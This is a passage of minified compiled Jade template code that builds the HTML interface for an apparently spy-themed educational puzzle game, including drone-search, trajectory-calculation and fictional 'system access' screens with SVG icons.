d="M78.5,14.3H68.2c-1.4,0-2.9-1.1-3.4-2.4l-2.7-8c-0.4-1.3-2-2.4-3.4-2.4H29.7c-1.4,0-2.9,1.1-3.4,2.4l-2.7,8\n		c-0.4,1.3-2,2.4-3.4,2.4H10.1c-4.7,0-8.6,3.8-8.6,8.6v38.5c0,4.7,3.8,8.6,8.6,8.6h68.4c4.7,0,8.6-3.8,8.6-8.6V22.9\n		C87,18.2,83.2,14.3,78.5,14.3z M44.3,59.2C33.6,59.2,25,50.6,25,40c0-10.6,8.6-19.2,19.2-19.2c10.6,0,19.2,8.6,19.2,19.2\n		C63.5,50.6,54.9,59.2,44.3,59.2z"/>\n</g>\n</svg>\n</div></div></div><div class="item audio-item"><img'+jade.attr("src",""+s.IMGS+"intel-sweep/eq-orange.png",!0,!1)+'/><div class="text"></div></div><div class="item text-item"><div class="text"></div><div class="translating blink">TRANSLATING . . .</div><div class="translation"></div></div><div class="item image-item"><img/><div class="screen-overlay"></div></div></div></div></div>')}.call(this,"paths"in a?a.paths:"undefined"!=typeof paths?paths:void 0),i.join("")},security_bypass:function(s){var i=[];return i.push('<div id="security-bypass" class="game-main"><div id="game-webgl"></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div><div id="game-ui" class="noselect"></div><div id="game-overlay"></div></div>'),i.join("")},trajectory_mapping:function(s){var i=[];return i.push('<div id="trajectory-mapping" class="game-main"><div id="debug-text"></div><div id="game-webgl"></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div><div id="ui-overlay"><div id="calc-panels" class="panels right"><div id="calc1" class="panel"><div class="title"><div class="text">EXPLOSION INTEL</div><div class="wand right"></div></div><div class="subtitle">PRE-EXPLOSION</div><div class="item"><div class="label">x pos (m):</div><div id="x-pre" class="value">123</div></div><div class="item"><div class="label">y pos (m):</div><div id="y-pre" class="value">123</div></div><div class="item"><div class="label">z pos (m):</div><div id="z-pre" class="value">123</div></div><div class="item"><div class="label">time (s):</div><div id="t-pre" class="value">123</div></div><div class="subtitle">POST-EXPLOSION</div><div class="item"><div class="label">x pos (m):</div><div id="x-post" class="value">123</div></div><div class="item"><div class="label">y pos (m):</div><div id="y-post" class="value">123</div></div><div class="item"><div class="label">z pos (m):</div><div id="z-post" class="value">123</div></div><div class="item"><div class="label">time (s):</div><div id="t-post" class="value">123</div></div><div class="spacer"></div><div class="title"><div class="text">SOLVE VELOCITY</div><div class="wand right"></div></div><div class="input-item"><div class="label">x (m/s):</div><input type="text" id="v-post-x"/></div><div class="input-item"><div class="label">y (m/s):</div><input type="text" id="v-post-y"/></div><div class="input-item"><div class="label">z (m/s):</div><input type="text" id="v-post-z"/></div><div class="spacer"></div><div id="panel-deploy-btn" class="deploy-btn"><div class="tmTxt tmC">DEPLOY</div><div class="tmC1 tmC"></div><div class="tmC2 tmC"></div><div class="tmC3 tmC"></div><div class="stemBtn tmC"></div><div class="stemSideline"></div></div></div></div><div id="mobile-deploy-btn" class="deploy-btn"><div class="tmTxt tmC">DEPLOY</div><div class="tmC1 tmC"></div><div class="tmC2 tmC"></div><div class="tmC3 tmC"></div><div class="stemBtn tmC"></div><div class="stemSideline"></div></div><div id="answer-prompt"></div></div></div>'),i.join("")},uav_search:function(s){var i=[];return i.push('<div id="uav-search" class="game-main"><div id="debug-text"></div><div id="game-webgl"></div><div id="ui-overlay"><div id="candidate-panel" class="panels left"><div class="panel score-panel"></div><div class="panel"><div class="title"><div class="text">ITEMS OF INTEREST</div><div class="wand right"></div></div><div id="candidate-text" class="score-text">SCANNED: 0/24</div><div id="positive-text" class="score-text">POSITIVE: 0/4</div><div class="spacer"></div><div id="big-img-frame"><div id="big-img"></div></div><div id="view-btn-ir" data-view="ir" class="view-btn selected">THERMAL</div><div id="view-btn-spec" data-view="spec" class="view-btn right">SPECTRAL</div><div id="thumbs">'),function(){var s=[0,1,2,3];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){var l=s[a];(function(){var s=[0,1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){var n=s[a];i.push("<div"+jade.attr("id","thumb-"+(6*l+n),!0,!1)+jade.attr("data-id",6*l+n,!0,!1)+' class="thumb inactive"></div>')}else{var e=0;for(var a in s){e++;var n=s[a];i.push("<div"+jade.attr("id","thumb-"+(6*l+n),!0,!1)+jade.attr("data-id",6*l+n,!0,!1)+' class="thumb inactive"></div>')}}}).call(this)}else{var e=0;for(var a in s){e++;var l=s[a];(function(){var s=[0,1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){var n=s[a];i.push("<div"+jade.attr("id","thumb-"+(6*l+n),!0,!1)+jade.attr("data-id",6*l+n,!0,!1)+' class="thumb inactive"></div>')}else{var e=0;for(var a in s){e++;var n=s[a];i.push("<div"+jade.attr("id","thumb-"+(6*l+n),!0,!1)+jade.attr("data-id",6*l+n,!0,!1)+' class="thumb inactive"></div>')}}}).call(this)}}}.call(this),i.push('</div><div class="spacer"></div><div id="submit-btn" class="uav-btn">SUBMIT TO HQ</div></div></div><div id="uav-panel" class="panels right"><div class="panel"><div class="title"><div class="text">DRONE CONTROLS</div><div class="wand right"></div></div>'),function(){var s=[0,1,2];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="uav-info">'),function(){var s=[0,1,2,3];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="cp grabbable"></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="cp grabbable"></div>')}}}.call(this),i.push('<div class="stat-panel health"><div class="bar bkgnd"></div><div class="bar health"></div></div><div class="stat-panel fuel"><div class="bar bkgnd"></div><div class="bar fuel"></div></div></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="uav-info">'),function(){var s=[0,1,2,3];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="cp grabbable"></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="cp grabbable"></div>')}}}.call(this),i.push('<div class="stat-panel health"><div class="bar bkgnd"></div><div class="bar health"></div></div><div class="stat-panel fuel"><div class="bar bkgnd"></div><div class="bar fuel"></div></div></div>')}}}.call(this),i.push('<div id="drag-prompt">DRAG POINT <br> TO THE MAP</div></div></div><div id="analyze-btn" class="uav-btn enabled">ANALYZE</div><div id="cover-panel"><div id="exit-btn" class="uav-btn enabled">EXIT</div></div></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div></div>'),i.join("")},"game-intro":function(s){var i,a=[],e=s||{};return function(s,e,l,n){a.push('<div class="bracket-container"><div class="content"><div class="dash-title">'+jade.escape(null==(i=s)?"":i)+'</div><h1 class="name">'),function(){var s=e.split(" ");if("number"==typeof s.length)for(var l=0,n=s.length;n>l;l++){var t=s[l];a.push("<div"+jade.attr("data-label",t,!0,!1)+' class="word">'+jade.escape(null==(i=t)?"":i)+"</div>")}else{var n=0;for(var l in s){n++;var t=s[l];a.push("<div"+jade.attr("data-label",t,!0,!1)+' class="word">'+jade.escape(null==(i=t)?"":i)+"</div>")}}}.call(this),a.push('</h1><p class="description">'),function(){var s=l;if("number"==typeof s.length)for(var e=0,n=s.length;n>e;e++){var t=s[e];a.push("<span>"+jade.escape(null==(i=t)?"":i)+"</span>")}else{var n=0;for(var e in s){n++;var t=s[e];a.push("<span>"+jade.escape(null==(i=t)?"":i)+"</span>")}}}.call(this),a.push("</p>");var t=n||"continue";a.push('<div class="btn rect-btn continue"><div class="label">'+jade.escape(null==(i=t)?"":i)+"</div>"),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){s[e];a.push('<div class="mask"><span>'+jade.escape(null==(i=t)?"":i)+"</span></div>")}else{var l=0;for(var e in s){l++;s[e];a.push('<div class="mask"><span>'+jade.escape(null==(i=t)?"":i)+"</span></div>")}}}.call(this),a.push('</div></div><div class="bracket tr"></div><div class="bracket tl"></div><div class="bracket bl"></div><div class="bracket br"></div></div>')}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0,"name"in e?e.name:"undefined"!=typeof name?name:void 0,"description"in e?e.description:"undefined"!=typeof description?description:void 0,"buttonLabel"in e?e.buttonLabel:"undefined"!=typeof buttonLabel?buttonLabel:void 0),a.join("")},"game-result":function(s){var i,a=[],e=s||{};return function(s,e,l,n,t,d,c){if(s&&(a.push('<div class="bracket-container won"><div class="content">'),e&&l?a.push('<div class="dash-title">Cryptaris</div>'):a.push('<div class="dash-title">'+jade.escape(null==(i=n)?"":i)+"</div>"),t&&a.push('<h1 class="completed">completed</h1>'),e&&l?a.push('<h1 class="completed">mission completed</h1>'):e&&a.push('<h1 class="completed">stage '+jade.escape(null==(i=d)?"":i)+" passed</h1>"),a.push('<div class="score-display"></div><div class="triangle-wand"><div class="double-wand"></div></div><div class="buttons">'),t&&(a.push('<div class="btn rect-btn retry"><div class="label">replay</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>replay</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>replay</span></div>')}}}.call(this),a.push('</div><div class="btn rect-btn training"><div class="label">training</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>training</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>training</span></div>')}}}.call(this),a.push("</div>")),e&&(a.push('<div class="btn rect-btn next"><div class="label">continue</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>continue</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>continue</span></div>')}}}.call(this),a.push("</div>")),e&&!c.logged_in&&(a.push('<div class="btn rect-btn save"><div class="label">save</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>save</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>save</span></div>')}}}.call(this),a.push("</div>")),a.push('</div></div><div class="bracket tr"></div><div class="bracket tl"></div><div class="bracket bl"></div><div class="bracket br"></div></div>')),!s){a.push('<div class="bracket-container lost"><div class="content">'),t&&a.push('<div class="dash-title">'+jade.escape(null==(i=n)?"":i)+'</div><h1 class="failed">challenge failed</h1>'),e&&l?a.push('<div class="dash-title">Cryptaris</div><h1 class="failed">mission failed</h1>'):e&&a.push('<div class="dash-title">'+jade.escape(null==(i=n)?"":i)+'</div><h1 class="failed">stage '+jade.escape(null==(i=d)?"":i)+" failed</h1>"),a.push('<div class="triangle-wand"><div class="double-wand"></div></div><div class="buttons">');var v=l?"start over":"try again";a.push('<div class="btn rect-btn retry"><div class="label">'+jade.escape(null==(i=v)?"":i)+"</div>"),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){s[e];a.push('<div class="mask"><span>'+jade.escape(null==(i=v)?"":i)+"</span></div>")}else{var l=0;for(var e in s){l++;s[e];a.push('<div class="mask"><span>'+jade.escape(null==(i=v)?"":i)+"</span></div>")}}}.call(this),a.push('</div><div class="btn rect-btn training"><div class="label">training</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>training</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>training</span></div>')}}}.call(this),a.push("</div>"),e&&!c.logged_in&&(a.push('<div class="btn rect-btn save"><div class="label">save</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var i=0,e=s.length;e>i;i++){s[i];a.push('<div class="mask"><span>save</span></div>')}else{var e=0;for(var i in s){e++;s[i];a.push('<div class="mask"><span>save</span></div>')}}}.call(this),a.push("</div>")),a.push('</div></div><div class="bracket tr"></div><div class="bracket tl"></div><div class="bracket bl"></div><div class="bracket br"></div></div>')}}.call(this,"wonGame"in e?e.wonGame:"undefined"!=typeof wonGame?wonGame:void 0,"isMission"in e?e.isMission:"undefined"!=typeof isMission?isMission:void 0,"missionEnded"in e?e.missionEnded:"undefined"!=typeof missionEnded?missionEnded:void 0,"title"in e?e.title:"undefined"!=typeof title?title:void 0,"isTraining"in e?e.isTraining:"undefined"!=typeof isTraining?isTraining:void 0,"gameNum"in e?e.gameNum:"undefined"!=typeof gameNum?gameNum:void 0,"user"in e?e.user:"undefined"!=typeof user?user:void 0),a.join("")},"gameshell-main":function(s){var i=[];return i.push('<div class="main"></div><div class="game-instructions"></div><div class="open-instructions-btn btn">?<!-- Generator: Adobe Illustrator 19.1.0, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="76px" height="76px" viewBox="0 0 76 76" style="enable-background:new 0 0 76 76;" xml:space="preserve">\n<style type="text/css">\n	.info-st0{opacity:0.75;}\n	.info-st1{opacity:0.5;fill:none;stroke:#FFCB05;stroke-miterlimit:10;}\n	.info-st2{opacity:0.25;fill:none;stroke:#FFFFFF;stroke-miterlimit:10;}\n</style>\n<defs>\n</defs>\n<circle class="info-st0" cx="38" cy="38" r="38"/>\n<path class="info-st1" d="M64,20c8.6,12.3,7.3,29.4-3.6,40.4C49.3,71.5,32,72.6,19.6,63.8"/>\n<path class="info-st2" d="M12,56.2c-8.6-12.3-7.3-29.4,3.6-40.4C26.8,4.7,44.1,3.5,56.4,12.4"/>\n</svg>\n</div><div class="panel"><div class="game-intro"></div><div class="game-result"></div></div><div class="webgl-tunnel"></div>'),i.join("")},"mission-chapter":function(s){var i=[];return i.push('<div class="gameshell"></div><div class="story"></div>'),i.join("")},"mission-main":function(s){var i,a=[],e=s||{};return function(s,e){a.push('<div class="mission-intro game-intro"></div><div class="scrollable-menu">'),function(){var l=s.chapters;if("number"==typeof l.length)for(var n=0,t=l.length;t>n;n++){var d=l[n];a.push("<div"+jade.attr("rel",d.game.slug,!0,!1)+jade.cls(["menu-item-tile",""+(n>e?"disabled":"")],[null,!0])+'><div class="image"></div><div class="level">LEVEL</div><div class="number">0'+jade.escape(null==(i=n+1)?"":i)+'</div><div class="title">'),function(){var s=d.game.title.split(" ");if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}else{var l=0;for(var e in s){l++;var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}}}.call(this),a.push("</div></div>")}else{var t=0;for(var n in l){t++;var d=l[n];a.push("<div"+jade.attr("rel",d.game.slug,!0,!1)+jade.cls(["menu-item-tile",""+(n>e?"disabled":"")],[null,!0])+'><div class="image"></div><div class="level">LEVEL</div><div class="number">0'+jade.escape(null==(i=n+1)?"":i)+'</div><div class="title">'),function(){var s=d.game.title.split(" ");if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}else{var l=0;for(var e in s){l++;var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}}}.call(this),a.push("</div></div>")}}}.call(this),a.push('</div><div class="chapter"></div>')}.call(this,"mission"in e?e.mission:"undefined"!=typeof mission?mission:void 0,"enabledMax"in e?e.enabledMax:"undefined"!=typeof enabledMax?enabledMax:void 0),a.join("")},"mission-result":function(s){var i=[];return i.join("")},"mission-story":function(s){var i=[],a=s||{};return function(s){i.push('<video autoplay="autoplay" muted="muted"><source'+jade.attr("src",""+s+".webm",!0,!1)+' type="video/webm"/><source'+jade.attr("src",""+s+".mp4",!0,!1)+' type="video/mp4"/></video><div class="play-btn btn"></div>')}.call(this,"video"in a?a.video:"undefined"!=typeof video?video:void 0),i.join("")},"training-room-main":function(s){
var i,a=[],e=s||{};return function(s){a.push('<div class="gameshell"></div><div class="main"><div class="indicator"><div class="center-mark"></div><div class="nums">'),function(){var e=[1,2,3];if("number"==typeof e.length)for(var l=0,n=e.length;n>l;l++){e[l];(function(){var e=s;if("number"==typeof e.length)for(var l=0,n=e.length;n>l;l++){e[l];a.push('<div class="num"><div class="label"><span>'+jade.escape(null==(i="0"+(l+1))?"":i)+"</span></div></div>")}else{var n=0;for(var l in e){n++;e[l];a.push('<div class="num"><div class="label"><span>'+jade.escape(null==(i="0"+(l+1))?"":i)+"</span></div></div>")}}}).call(this)}else{var n=0;for(var l in e){n++;e[l];(function(){var e=s;if("number"==typeof e.length)for(var l=0,n=e.length;n>l;l++){e[l];a.push('<div class="num"><div class="label"><span>'+jade.escape(null==(i="0"+(l+1))?"":i)+"</span></div></div>")}else{var n=0;for(var l in e){n++;e[l];a.push('<div class="num"><div class="label"><span>'+jade.escape(null==(i="0"+(l+1))?"":i)+"</span></div></div>")}}}).call(this)}}}.call(this),a.push('</div><div class="ticks-holder"><div class="ticks"></div><div class="tri-btn btn r"><div class="tri right"></div></div><div class="tri-btn btn l"><div class="tri left"></div></div></div></div><div class="scrollable-menu">'),function(){var e=s;if("number"==typeof e.length)for(var l=0,n=e.length;n>l;l++){var t=e[l];a.push("<div"+jade.attr("rel",t.slug,!0,!1)+' class="menu-item-tile"><div class="image"></div><div class="level">CHALLENGE</div><div class="number">0'+jade.escape(null==(i=l+1)?"":i)+'</div><div class="title">'),function(){var s=t.title.split(" ");if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}else{var l=0;for(var e in s){l++;var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}}}.call(this),a.push("</div></div>")}else{var n=0;for(var l in e){n++;var t=e[l];a.push("<div"+jade.attr("rel",t.slug,!0,!1)+' class="menu-item-tile"><div class="image"></div><div class="level">CHALLENGE</div><div class="number">0'+jade.escape(null==(i=l+1)?"":i)+'</div><div class="title">'),function(){var s=t.title.split(" ");if("number"==typeof s.length)for(var e=0,l=s.length;l>e;e++){var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}else{var l=0;for(var e in s){l++;var n=s[e];a.push('<div class="word">'+jade.escape(null==(i=n)?"":i)+"</div>")}}}.call(this),a.push("</div></div>")}}}.call(this),a.push("</div></div>")}.call(this,"games"in e?e.games:"undefined"!=typeof games?games:void 0),a.join("")},access_intel:function(s){var i=[];return i.push('<div class="access_intel fullframe"><div class="webgl fullframe"><canvas class="fullframe webgl"></canvas><canvas class="numbergrid fullframe hide"></canvas><div class="css fullframe"></div></div><div class="levels"></div><div class="finale fullframe"></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div></div>'),i.join("")},"helminth-takeover":function(s){var i=[];return i.push('<canvas class="takeover-webgl"></canvas><div class="progress"></div>'),i.join("")},access_intel_level1:function(s){var i=[];return i.push('<div class="access_intel ring1"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="backring _1"><circle cx="355" cy="355" r="350" stroke="#222222" stroke-width="10" fill="none"></circle></svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="ring _1"><circle cx="355" cy="355" r="350" stroke="#ffffff" stroke-width="10" stroke-dasharray="2200" stroke-dashoffset="0" fill="none"></circle></svg></div><div class="access_intel ring2"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="backring _2"><circle cx="485" cy="485" r="460" stroke="#222222" stroke-width="50" fill="none"></circle></svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="ring _2"><circle cx="485" cy="485" r="460" stroke="#ffffff" stroke-width="50" stroke-dasharray="2890" stroke-dashoffset="0" fill="none"></circle></svg></div><div class="access_intel ring3"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="backring _3"><circle cx="652" cy="652" r="650" stroke="#222222" stroke-width="3" fill="none"></circle></svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="ring _3"><circle cx="652" cy="652" r="650" stroke="#ffffff" stroke-width="3" stroke-dasharray="4090" stroke-dashoffset="0" fill="none"></circle></svg></div><div class="level1 main"><div class="foldertitle">SYSTEM ACCESS</div><div class="inputs"><div class="line"><span class="num"><span class="inside">01</span></span><input class="code1"/></div><div class="line"><span class="num"><span class="inside">02</span></span><input class="code2"/></div><div class="line"><span class="num"><span class="inside">03</span></span><input class="code3"/></div></div></div>'),i.join("")},access_intel_level2_file_icon:function(s){var i,a=[],e=s||{};return function(s){a.push('<div class="button file"><div class="inner"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" height="84" width="60"><polygon fill="none" stroke="#aaaaaa" stroke-opacity="0.5" height="84" width="60" stroke-miterlimit="10" points="58.5,70.5 13.5,70.5 13.5,14.6 47.4,14.6 58.5,26.2 "></polygon></svg><div class="title">'+jade.escape(null==(i=s)?"":i)+"</div></div></div>")}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0),a.join("")},access_intel_level2_file_image:function(s){var i,a=[],e=s||{};return function(s,e){a.push('<div class="title">'+jade.escape(null==(i=s)?"":i)+"</div><img"+jade.attr("src",""+e,!0,!1)+'/><div class="btn download"></div><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div>')}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0,"constructed_url"in e?e.constructed_url:"undefined"!=typeof constructed_url?constructed_url:void 0),a.join("")},access_intel_level2_file_text:function(s){var i,a=[],e=s||{};return function(s,e){a.push('<div class="title">'+jade.escape(null==(i=s)?"":i)+'</div><div class="body">'+(null==(i=e)?"":i)+'</div><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div>')}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0,"decoded_content"in e?e.decoded_content:"undefined"!=typeof decoded_content?decoded_content:void 0),a.join("")},access_intel_level2_folder:function(s){var i,a=[],e=s||{};return function(s){a.push('<svg height="10" width="10" xmlns="http://www.w3.org/2000/svg" version="1.1"><defs><pattern id="dot1" patternUnits="userSpaceOnUse" width="4" height="4"><rect height="1" width="1" fill="#555555"></rect></pattern></defs></svg><svg xmlns="http://www.w3.org/2000/svg" height="500" width="500" version="1.1" class="dotring"><circle style="stroke: url(#dot1) #fff;" fill="transparent" stroke="#000000" stroke-width="4" stroke-miterlimit="10" stroke-dasharray="1400" stroke-dashoffset="-1400" cx="170" cy="170" r="0"></circle></svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="innerbackring"><circle cx="67" cy="67" r="40" stroke="#272727" stroke-width="2" fill="none"></circle></svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="innerring"><circle cx="67" cy="67" r="0" stroke="#555555" stroke-width="2" stroke-dashoffset="0" stroke-dasharray="300" fill="none"></circle></svg><div class="foldertitle">'+jade.escape(null==(i=s)?"":i)+'</div><div class="buttoncontainer"></div><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div><div class="hitarea"></div>')}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0),a.join("")},access_intel_level2_folder_icon:function(s){var i,a=[],e=s||{};return function(s,e){a.push('<div class="button folder"><div class="inner"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" height="80" width="100"><polygon stroke="#aaaaaa" stroke-opacity="0.5" stroke-miterlimit="10" points="86.5,70.5 13.5,70.5 13.5,14.6 59.4,14.6 58.4,23.5 86.5,23.5 " height="80" width="100"></polygon><polyline stroke="#aaaaaa" stroke-opacity="0.5" stroke-miterlimit="10" points="13.5,14.6 58.3,14.6 58.4,23.5 " height="80" width="100"></polyline></svg><div class="contains">'+jade.escape(null==(i=s)?"":i)+'</div><div class="title">'+jade.escape(null==(i=e)?"":i)+"</div></div></div>")}.call(this,"contains"in e?e.contains:"undefined"!=typeof contains?contains:void 0,"title"in e?e.title:"undefined"!=typeof title?title:void 0),a.join("")},access_intel_level2_locked_folder:function(s){var i=[];return i.push('<div class="title"></div><div class="color-selector noselect"><div class="outside"></div><div class="middle"></div><div class="inside"></div></div><div class="login"><div class="login-title noselect">LOGIN</div><div class="password"><span class="title noselect">P</span><input/></div></div><canvas class="noselect"></canvas><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div>'),i.join("")},access_intel_level2_locked_folder_icon:function(s){var i,a=[],e=s||{};return function(s){a.push('<div class="button locked folder"><div class="inner"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" height="80" width="100"><polygon stroke="none" points="86.5,70.5 13.5,70.5 13.5,14.6 59.4,14.6 58.4,23.5 86.5,23.5 " height="80" width="100" style="fill: url(#dot3) #fff;"></polygon><polyline stroke="none" points="13.5,14.6 58.3,14.6 58.4,23.5 " height="80" width="100" style="fill: url(#dot3) #fff;"></polyline></svg><div class="title">'+jade.escape(null==(i=s)?"":i)+'</div></div><div class="lock"></div></div><svg height="10" width="10" xmlns="http://www.w3.org/2000/svg" version="1.1"><defs><pattern id="dot3" patternUnits="userSpaceOnUse" width="3" height="3"><rect height="1" width="1" fill="#aaaaaa"></rect><rect height="1" width="1" fill="#aaaaaa" x="1" y="1"></rect><rect height="1" width="1" fill="#aaaaaa" x="2" y="2"></rect></pattern></defs></svg>')}.call(this,"title"in e?e.title:"undefined"!=typeof title?title:void 0),a.join("")},access_intel_level3:function(s){var i=[];return i.push('<div class="access_intel level3 lightbox doubleframe"><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div></div><div class="access_intel level3 documents"></div>'),i.join("")},access_intel_level3_mapviewer:function(s){var i,a=[],e=s||{};return function(s){a.push('<div class="container fullframe"></div><div class="title"><div class="word">GRAPH</div><div class="num">0'+jade.escape(null==(i=s)?"":i)+"</div></div>")}.call(this,"idx"in e?e.idx:"undefined"!=typeof idx?idx:void 0),a.join("")},access_intel_level3_modelviewer:function(s){var i,a=[],e=s||{};return function(s){a.push('<canvas></canvas><div class="modelview_css"></div><div class="title"><div class="word">GRAPH</div><div class="num">0'+jade.escape(null==(i=s)?"":i)+"</div></div>")}.call(this,"idx"in e?e.idx:"undefined"!=typeof idx?idx:void 